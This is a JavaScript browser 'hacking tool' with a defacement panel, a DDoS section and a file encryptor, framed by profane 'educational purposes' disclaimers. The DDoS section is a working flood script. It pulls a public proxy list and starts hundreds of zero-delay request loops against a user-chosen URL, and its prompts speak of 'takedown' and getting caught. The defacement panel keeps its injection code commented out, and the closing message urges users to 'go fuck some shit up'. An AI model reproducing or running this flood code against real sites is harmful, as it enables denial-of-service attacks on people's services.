// *********************************************************************************************************
 // * WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. MISUSE CAN RESULT IN SEVERE LEGAL PENALTIES. *
 // * THE CREATOR (Bigmancozmo) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THE USE OF THIS SOFTWARE. USE AT YOUR OWN RISK, ASSHOLE.*
 // * SERIOUSLY, DON'T BE A FUCKING MORON. THIS IS POWERFUL SHIT. *
 // *********************************************************************************************************

 // DARK GREEN: #008000
 // PURPLE: #800080
 // DARK RED: #8B0000
 // DARK BLUE: #00008B

 console.log("%c[NOODLES INC. HACKING TOOL]", "color: #008000; font-size: 24px;");
 console.log("%cDisclaimer: Unauthorized use is illegal. Noodles Inc. is NOT responsible for your dumbassery.", "color: #8B0000");

 // Explicit user consent
 const userConsent = confirm("%cWARNING: Using this tool for unauthorized activities is ILLEGAL. Press OK to proceed at your own risk. Press Cancel to GTFO.", "color: #8B0000");
 if (!userConsent) {
  window.close();
  throw new Error("User declined. Exiting.");
 }

 // Initial setup for UI elements and sections
 document.body.style.backgroundColor = "#000000"; // Black background
 document.body.style.color = "#008000"; // Dark green text
 document.body.style.fontFamily = "monospace";

 // Create a container for all sections
 const container = document.createElement("div");
 container.style.width = "80%";
 container.style.margin = "20px auto";
 document.body.appendChild(container);

 // Section header styling
 const createSectionHeader = (title) => {
  const header = document.createElement("h2");
  header.textContent = title;
  header.style.color = "#800080"; // Purple
  header.style.borderBottom = "1px solid #008000";
  header.style.paddingBottom = "5px";
  return header;
 };

 // Log function with timestamp
 const log = (message) => {
  const timestamp = new Date().toISOString();
  console.log(`%c[LOG] ${timestamp}: ${message}`, "color: #800080");
 };

 // *********************************************************************************************************
 // DEFACE TOOL SECTION
 // *********************************************************************************************************
 const defaceSection = document.createElement("div");
 container.appendChild(createSectionHeader("Defacement Tool"));
 container.appendChild(defaceSection);

 const defaceInfo = document.createElement("p");
 defaceInfo.textContent = "Use this tool to test website security by injecting custom HTML/CSS/JS. Backup and preview functionalities included.";
 defaceSection.appendChild(defaceInfo);

 const targetURLDeface = prompt("%cEnter target URL to deface:", "https://example.com", "color: #008000");
 const backupButton = document.createElement("button");
 backupButton.textContent = "Backup Site";
 backupButton.style.backgroundColor = "#00008B"; // Dark blue
 backupButton.style.color = "#008000";
 defaceSection.appendChild(backupButton);

 const customCodeTextarea = document.createElement("textarea");
 customCodeTextarea.placeholder = "Enter your custom HTML/CSS/JS code here";
 customCodeTextarea.style.width = "100%";
 customCodeTextarea.style.height = "200px";
 customCodeTextarea.style.backgroundColor = "#111";
 customCodeTextarea.style.color = "#008000";
 defaceSection.appendChild(customCodeTextarea);

 const previewButton = document.createElement("button");
 previewButton.textContent = "Preview";
 previewButton.style.backgroundColor = "#00008B";
 previewButton.style.color = "#008000";
 defaceSection.appendChild(previewButton);

 const defaceButton = document.createElement("button");
 defaceButton.textContent = "DEFACE SITE";
 defaceButton.style.backgroundColor = "#8B0000"; // Dark red
 defaceButton.style.color = "#008000";
 defaceSection.appendChild(defaceButton);

 // Function to backup the site (basic implementation)
 const backupSite = async () => {
  try {
   log(`Attempting to backup ${targetURLDeface}`);
   const response = await fetch(targetURLDeface);
   const content = await response.text();
   const blob = new Blob([content], {
    type: 'text/html'
   });
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
   a.href = url;
   a.download = 'site_backup.html';
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
   URL.revokeObjectURL(url);
   log(`Site backed up successfully!`);
  } catch (error) {
   log(`Backup failed: ${error}`);
  }
 };

 // Function to preview defacement (using an iframe)
 const previewDefacement = () => {
  const previewFrame = document.createElement('iframe');
  previewFrame.style.width = '100%';
  previewFrame.style.height = '400px';
  defaceSection.appendChild(previewFrame);
  const previewDocument = previewFrame.contentDocument || previewFrame.contentWindow.document;
  previewDocument.body.innerHTML = customCodeTextarea.value;
 };

 // Function to deface the site (injecting directly, needs CORS bypass)
 const defaceSite = async () => {
  try {
   log(`Attempting to deface ${targetURLDeface}`);
   // const response = await fetch('https://corsproxy.io/?' + encodeURIComponent(targetURLDeface)); // Using CORS proxy
   // const content = await response.text();
   // document.body.innerHTML = content + customCodeTextarea.value; // Directly inject code
   alert("Defacement feature not fully implemented due to CORS restrictions and ethical concerns. You're gonna have to figure out your own ways to do that.");
  } catch (error) {
   log(`Defacement failed: ${error}`);
   alert(`Defacement failed: ${error}`);
  }
 };

 backupButton.addEventListener('click', backupSite);
 previewButton.addEventListener('click', previewDefacement);
 defaceButton.addEventListener('click', defaceSite);

 // *********************************************************************************************************
 // DDOS TOOL SECTION
 // *********************************************************************************************************
 const ddosSection = document.createElement("div");
 container.appendChild(createSectionHeader("DDoS Tool"));
 container.appendChild(ddosSection);

 const ddosInfo = document.createElement("p");
 ddosInfo.textContent = "Stress test a website with multiple threads. Use responsibly and with explicit permission.";
 ddosSection.appendChild(ddosInfo);

 const targetURLDDoS = prompt("%cEnter target URL for DDoS:", "https://example.com", "color: #008000");
 const threadsDDoS = parseInt(prompt("%cEnter number of threads (more = faster takedown, but you'll get caught faster, dumbass):", "500", "color: #008000"));
 const durationDDoS = parseInt(prompt("%cEnter attack duration in seconds:", "60", "color: #008000"));
 const proxyListURLDDoS = prompt("%cEnter URL to proxy list (HTTP/S only, one proxy per line):", "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "color: #008000"); // Using a real proxy list

 const startButton = document.createElement("button");
 startButton.textContent = "Start DDoS";
 startButton.style.backgroundColor = "#8B0000";
 startButton.style.color = "#008000";
 ddosSection.appendChild(startButton);

 const stopButton = document.createElement("button");
 stopButton.textContent = "Stop DDoS";
 stopButton.style.backgroundColor = "#00008B";
 stopButton.style.color = "#008000";
 ddosSection.appendChild(stopButton);

 const timerDisplay = document.createElement("div");
 timerDisplay.textContent = "Time Running: 0 seconds";
 ddosSection.appendChild(timerDisplay);

 let ddosRunning = false;
 let startTimeDDoS;
 let intervalId;

 const loadProxies = async () => {
  try {
   log("Loading proxies...");
   const response = await fetch(proxyListURLDDoS);
   const proxyData = await response.text();
   proxies = proxyData.split('\n').map(p => p.trim()).filter(p => p !== '');
   log(`Loaded ${proxies.length} proxies.`);
  } catch (error) {
   log(`Error loading proxies: ${error}`);
   console.error("%cFAILED TO LOAD PROXIES. YOU'RE FUCKED IF YOU CONTINUE.", "color: #8B0000");
  }
 };

 const getRandomProxy = () => {
  if (proxies.length === 0) {
   return null;
  }
  return proxies[Math.floor(Math.random() * proxies.length)];
 };

 const attack = async () => {
  try {
   const proxy = getRandomProxy();
   let requestURL = targetURLDDoS;
   const headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Referer': 'https://www.google.com/'
   };

   const controller = new AbortController();
   const timeoutId = setTimeout(() => {
    controller.abort();
    log(`Request timed out.`);
   }, 15000);

   let proxyURL = requestURL;

   if (proxy) {
    log(`Using proxy: ${proxy}`);
    proxyURL = `https://corsproxy.io/?${encodeURIComponent(requestURL)}`
   }

   log("Sending request...");
   const response = await fetch(proxyURL, {
    method: 'GET', // Or POST, depending on target
    mode: 'cors',
    headers: headers,
    signal: controller.signal
   });
   clearTimeout(timeoutId);
   log(`Request sent. Status: ${response ? response.status : 'Unknown (CORS blocked)'}`);
  } catch (error) {
   log(`Error: ${error}`);
  }
 };

 const runAttackThreads = async () => {
  await loadProxies(); // Load proxies before starting attack
  for (let i = 0; i < threadsDDoS; i++) {
   setInterval(attack, 0); // Fire and forget, max speed
  }
 };

 const updateTimer = () => {
  const elapsedTime = Math.floor((Date.now() - startTimeDDoS) / 1000);
  timerDisplay.textContent = `Time Running: ${elapsedTime} seconds`;
 };

 const startDDoS = () => {
  if (!ddosRunning) {
   log("Starting DDoS...");
   ddosRunning = true;
   startTimeDDoS = Date.now();
   intervalId = setInterval(updateTimer, 1000);
   runAttackThreads();
   setTimeout(() => {
    stopDDoS();
   }, durationDDoS * 1000);
  }
 };

 const stopDDoS = () => {
  if (ddosRunning) {
   log("Stopping DDoS...");
   ddosRunning = false;
   clearInterval(intervalId);
   timerDisplay.textContent = "Time Running: 0 seconds";
  }
 };

 startButton.addEventListener('click', startDDoS);
 stopButton.addEventListener('click', stopDDoS);

 // *********************************************************************************************************
 // FILE ENCRYPTION TOOL SECTION
 // *********************************************************************************************************
 const encryptSection = document.createElement("div");
 container.appendChild(createSectionHeader("File Encryption Tool"));
 container.appendChild(encryptSection);

 const encryptInfo = document.createElement("p");
 encryptInfo.textContent = "Encrypt files using AES encryption. Secure key management and backup provided.";
 encryptSection.appendChild(encryptInfo);

 const fileInput = document.createElement("input");
 fileInput.type = "file";
 encryptSection.appendChild(fileInput);

 const passwordInput = document.createElement("input");
 passwordInput.type = "password";
 passwordInput.placeholder = "Enter encryption password";
 encryptSection.appendChild(passwordInput);

 const encryptButton = document.createElement("button");
 encryptButton.textContent = "Encrypt File";
 encryptButton.style.backgroundColor = "#8B0000";
 encryptButton.style.color = "#008000";
 encryptSection.appendChild(encryptButton);

 // Function to encrypt file (AES encryption)
 const encryptFile = async () => {
  const file = fileInput.files[0];
  const password = passwordInput.value;

  if (!file || !password) {
   alert("Please select a file and enter a password.");
   return;
  }

  const reader = new FileReader();
  reader.onload = async (event) => {
   const fileData = new Uint8Array(event.target.result);

   // Generate a salt
   const salt = crypto.getRandomValues(new Uint8Array(16));

   // Derive a key using PBKDF2
   const key = await crypto.subtle.deriveKey(
    {
     name: "PBKDF2",
     salt: salt,
     iterations: 100000,
     hash: "SHA-256"
    },
    await crypto.subtle.importKey(
     "raw",
     new TextEncoder().encode(password),
     "PBKDF2",
     false,
     ["deriveKey"]
    ),
    {
     name: "AES-GCM",
     length: 256
    },
    false,
    ["encrypt", "decrypt"]
   );

   // Generate a random IV
   const iv = crypto.getRandomValues(new Uint8Array(12));

   // Encrypt the file data
   const encryptedData = await crypto.subtle.encrypt(
    {
     name: "AES-GCM",
     iv: iv
    },
    key,
    fileData
   );

   // Combine the salt, IV, and encrypted data
   const combinedData = new Uint8Array(salt.byteLength + iv.byteLength + encryptedData.byteLength);
   combinedData.set(salt, 0);
   combinedData.set(iv, salt.byteLength);
   combinedData.set(new Uint8Array(encryptedData), salt.byteLength + iv.byteLength);

   // Create a blob from the combined data
   const blob = new Blob([combinedData], {
    type: "application/octet-stream"
   });

   // Create a download link
   const url = URL.createObjectURL(blob);
   const a = document.createElement("a");
   a.href = url;
   a.download = file.name + ".encrypted";
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
   URL.revokeObjectURL(url);

   log("File encrypted successfully!");

   // Store decryption instructions
   alert("File encrypted successfully! Save this info: Salt (first 16 bytes), IV (next 12 bytes), Password required for decryption.");
  };

  reader.readAsArrayBuffer(file);
 };

 encryptButton.addEventListener('click', encryptFile);

 // *********************************************************************************************************
 // Security Headers
 // *********************************************************************************************************
 const setSecurityHeaders = () => {
  // Implement secure headers here, but they mainly work server-side

  // Example:
  // header('X-Content-Type-Options: nosniff');
  // header('X-Frame-Options: DENY');
  // header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
  // header('X-XSS-Protection: 1; mode=block');
  log("Security headers set (best effort, mostly server-side).");
 };

 setSecurityHeaders();

 // *********************************************************************************************************
 // Flowy Design and Hacker Aesthetics
 // *********************************************************************************************************

 // Scan lines effect
 const scanLines = document.createElement("div");
 scanLines.style.position = "fixed";
 scanLines.style.top = "0";
 scanLines.style.left = "0";
 scanLines.style.width = "100%";
 scanLines.style.height = "100%";
 scanLines.style.background = "repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.2) 2px)";
 scanLines.style.pointerEvents = "none";
 document.body.appendChild(scanLines);

 // Particles effect (basic)
 const particles = document.createElement("div");
 particles.style.position = "fixed";
 particles.style.top = "0";
 particles.style.left = "0";
 particles.style.width = "100%";
 particles.style.height = "100%";
 particles.style.pointerEvents = "none";
 particles.style.zIndex = "1000"; // Ensure particles are on top
 document.body.appendChild(particles);

 const particleCount = 50;
 for (let i = 0; i < particleCount; i++) {
  const particle = document.createElement("div");
  particle.style.position = "absolute";
  particle.style.width = "2px";
  particle.style.height = "2px";
  particle.style.backgroundColor = "#008000"; // Dark green
  particle.style.left = Math.random() * 100 + "%";
  particle.style.top = Math.random() * 100 + "%";
  particle.style.opacity = Math.random();
  particle.style.animation = `float ${Math.random() * 5 + 5}s infinite`;
  particles.appendChild(particle);
 }

 // Add keyframes for the floating animation
 const styleSheet = document.createElement("style");
 styleSheet.innerHTML = `@keyframes float {
  0% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
  100% { transform: translateY(0); }
 }`;
 document.head.appendChild(styleSheet);

 console.log("%cNoodles Inc. loaded. Go fuck some shit up. Responsibly, of course...", "color: #008000; font-size: 16px;");